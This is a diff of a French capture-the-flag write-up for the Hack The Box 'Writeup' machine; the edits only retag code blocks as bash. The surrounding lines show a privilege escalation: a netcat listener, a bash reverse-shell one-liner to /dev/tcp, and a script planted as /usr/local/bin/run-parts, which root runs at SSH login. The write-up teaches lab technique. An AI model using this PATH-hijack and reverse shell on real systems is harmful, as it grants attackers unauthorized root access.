@@ -604,7 +604,7 @@ Pendant que `pspy64` est en cours d'exécution, tu ouvres une **nouvelle session
 
 Lors de la connexion SSH, tu observes l'exécution automatique de la commande suivante avec les privilèges root :
 
-```
+```bash
 sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d
 ```
 
@@ -660,7 +660,7 @@ Chaque fenêtre a un rôle bien défini. Cette organisation te permet d’agir *
 
 Sur ta machine Kali, prépare l’écoute réseau qui recevra le reverse shell root :
 
-```
+```bash
 nc -lvnp 4444
 ```
 
@@ -672,32 +672,32 @@ Dans cette fenêtre, tu vas **préparer** le binaire piégé, **sans encore le c
 
 1. Place-toi dans `/usr/local` :
 
-```
+```bash
 cd /usr/local
 ```
 
 1. Crée un script de reverse shell (par exemple `reverse_shell`) :
 
-```
+```bash
 nano reverse_shell
 ```
 
 1. Ajoute le contenu suivant (adapte l’IP à celle de ta machine Kali) :
 
-```
+```bash
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.14.xxx/4444 0>&1
 ```
 
 1. Rends le script exécutable :
 
-```
+```bash
 chmod +x reverse_shell
 ```
 
 1. **Prépare** la commande de copie vers `/usr/local/bin/run-parts`, **mais ne l’exécute pas encore** :
 
-```
+```bash
 cp reverse_shell /usr/local/bin/run-parts
 ```
 
@@ -707,7 +707,7 @@ cp reverse_shell /usr/local/bin/run-parts
 
 Dans cette fenêtre, lance **pspy64** pour surveiller l’activité système en temps réel :
 
-```
+```bash
 ./pspy64
 ```
 
@@ -718,7 +718,7 @@ Cette fenêtre est **ta référence temporelle**.
 
 Prépare ici une nouvelle connexion SSH, **sans valider la commande** :
 
-```
+```bash
 ssh jkr@writeup.htb
 ```
 
@@ -766,7 +766,7 @@ root
 
 Tu dois obtenir :
 
-```txt
+```bash
 root
 ```
 
